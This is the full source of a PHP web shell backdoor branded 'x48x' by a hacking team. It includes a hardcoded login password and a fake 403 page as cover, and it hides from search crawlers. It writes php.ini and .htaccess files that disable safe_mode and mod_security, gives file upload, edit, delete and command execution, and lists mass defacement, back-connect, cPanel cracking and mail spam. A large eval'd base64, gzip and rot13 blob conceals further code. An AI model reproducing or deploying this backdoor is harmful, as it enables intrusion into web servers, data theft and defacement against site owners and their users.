

<?php

/*
        
        x48x Shell Backdoor
        Recode by       : _Tuan2Fay_       
        Version         : 1.0                                                                      
        Team            : Garuda Security Hacker                                   
        Site            : https://blog.garudasecurityhacker.org
        Facebook    : https://www.facebook.com/gshofficialpageindonesia 
                                                                                   
*/

session_start();
error_reporting(0);
set_time_limit(0);
@set_magic_quotes_runtime(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
$auth_pass = "6e728e1a015ec418f999496a5f9212b7"; // pass : melodynl
$errorforbidden = $_SERVER['REQUEST_URI'];
$color = "#00ff00";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'UTF-8';
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
 
function login_shell() {
?>
<?php
$errorforbidden = $_SERVER['REQUEST_URI'];
?>
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access <?php print $errorforbidden; ?>
 on this server.</p>
<p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p>
</body></html>
<?php
if($_GET['ez'] == 'login')
{
echo '<br><br><br><br><br><center><form method="post"><input type="password" name="pass"><button>Hai Wots?</button></form></center>';
}
?>
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_shell();
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
?>
<?php
if (file_exists("php.ini")){
}else{
$img = fopen('php.ini', 'w');
$sec = "safe_mode = OFF
disable_funtions = NONE";
fwrite($img ,$sec);
fclose($img);}
if (file_exists(".htaccess")){
}else{
$img2 = fopen('.htaccess', 'w');
$sec2 = "<IfModule mod_security.c>
                SecFilterEngine Off
                SecFilterScanPOST Off
                </IfModule>";
fwrite($img2 ,$sec2);
fclose($img2);}
$inids = @ini_get("disable_functions");
$liatds = (!empty($ds)) ? "<font color='purple'>$inids</font>" : "<font color='white'>Aman cuk :v</font></b>";
if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo '<!DOCTYPE HTML>
<html>
<head>
<link href="https://fonts.googleapis.com/css?family=Kranky" rel="stylesheet">
<link href="http://fonts.googleapis.com/css?family=Fredericka+the+Great" rel="stylesheet" type="text/css">
<link href="https://fonts.googleapis.com/css?family=Rye" rel="stylesheet"> 
<link href="" rel="stylesheet" type="text/css">
<title>x48x</title>
<style>
body{
        font-family: Rye;
        background-image: url("http://chaesara.web.id/chbot/chimg/939462.png");
        color:purple;
        background-attachment:fixed;
        background-repeat:no-repeat;
        background-position:center;
        background-color:transparan;
        -webkit-background-size: 100% 100%;
}
#menu{
        margin:8px 2px 4px 2px;
        font-family:Rye;
        font-size:14px;
        color:silver;
        align:center;
}

#menu a{
        padding:3px 6px;
        margin:1;
        background:pink;
        align:center;
        text-decoration:none;
        letter-spacing:2px;
        -moz-border-radius: 10px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-radius: 5px;   
}

#menu a:hover{
        background:black;
        border-bottom:1px solid #ffffff;
        border-top:1px solid #ffffff;   
}

#content tr:hover{
        background-color: pink;
        text-shadow:0px 0px 10px #fff;
}

#content .first{
        background-color: pink;
}

table{
        border: 1px #000000 dotted;
}

a{
        color:violet;
        text-decoration: none;
}

a:hover{
        color:blue;
        text-shadow:0px 0px 10px #ffffff;
}

input,select,textarea{
        border: 1px #000000 solid;
        -moz-border-radius: 5px;
        -webkit-border-radius:5px;
        border-radius:5px;
}
</style>
</head>
<body>
<center><font color="violet" size="7" face="Fredericka the Great">|&hearts;| x48x Web Shell |&hearts;|</font></center><br>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>';
echo "System: <font color=violet>".php_uname()."</font><br>";
echo "Disable Functions: $liatds";
echo '<br><font color="purple">Path :</font> ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<script>alert("Upload Sukses Wots!");</script>';
}else{
echo '<script>alert("Gagal Upload Wots :(");</script>';
}
}
echo '<form enctype="multipart/form-data" method="POST">
<font color="purple">File Upload :</font> <input type="file" name="file" />
<input type="submit" value="upload" />
</form>';
echo "<form method='post'>
<font color='purple'>Command :</font>
<input type='text' size='30' height='10' name='cmd'><input type='submit' name='execmd' value=' Execute '>
</form>";
echo "</td></tr>";
echo "</table><br>";
echo "<center><table id='menu' width='700' border='0' cellpadding='3' cellspacing='1'><tr><td>";
echo "<center>[ <a href='?'>Rumah</a> ]<font color='pink'> ==</font>
[ <a href='?path=$path&ez=crdp'>Create RDP</a> ]<font color='pink'> ==</font>
[ <a href='?path=$path&ez=massde'>Mass Deface</a> ]<font color='pink'> ==</font>
[ <a href='?path=$path&ez=conkill'>Config Killer</a> ]<font color='pink'> ==</font>
[ <a href='?path=$path&ez=bypass'>Bypass</a> ]<br><br>
[ <a href='?path=$path&ez=userchanger'>User Changer</a> ]<font color='pink'> ==</font>
[ <a href='?path=$path&ez=cpcrack'>CP Crack</a> ]<font color='pink'> ==</font>
[ <a href='?path=$path&ez=salto'>Salto</a> ]<font color='pink'> ==</font>
[ <a href='?path=$path&ez=sym'>Symlink</a> ]<font color='pink'> ==</font>
[ <a href='?path=$path&ez=bceng'>Back C0nnect</a> ]<br><br>
[ <a href='?path=$path&ez=jones'>Zone-H</a> ]<font color='pink'> ==</font>
[ <a href='?path=$path&ez=zip'>Zip Menu</a> ]<font color='pink'> ==</font>
[ <a href='?path=$path&ez=cadminer'>Adminer</a> ]<font color='pink'> ==</font>
[ <a href='?path=$path&ez=endeco'>Encode/Decode</a> ]<font color='pink'> ==</font>
[ <a href='?path=$path&ez=about'>About</a> ]<br><br>
[ <a href='?path=$path&ez=spam'>Mail Spam</a> ]<font color='pink'> ==</font>
[ <a href='?path=$path&ez=csrf'>CSRF</a> ]<font color='pink'> ==</font>
[ <a href='?path=$path&go=cabs'>LogOut</a> ]</center>
";
echo "</td></tr></table></center>";
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}
elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<script>alert("Change Permission Sukses Wots!!");</script>';
}else{
echo '<script>alert("Gak bisa Change Permission Wots :( ");</script>';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<script>alert("Ganti Nama Sukses Wots!! ");</script>';
}else{
echo '<script>alert("Gak bisa Ganti Nama Wots :( ");</script>';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<script>alert("Edit File Sukses Wots ! ");</script>';
}else{
echo '<script>alert("Gak bisa Di Edit Wots :( ");</script>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';
}
echo '</center>';
}else{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="white">Directory Terhapus</font><br/>';
}else{
echo '<font color="purple">Directory Gagal Terhapus                                                                                                                                                                                                                                                                                             </font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="white">File Terhapus</font><br/>';
}else{
echo '<font color="purple">File Gagal Dihapus</font><br/>';
}
}
}
//////////////ini toolsnya ya om :)
eval(str_rot13(gzinflate(str_rot13(base64_decode('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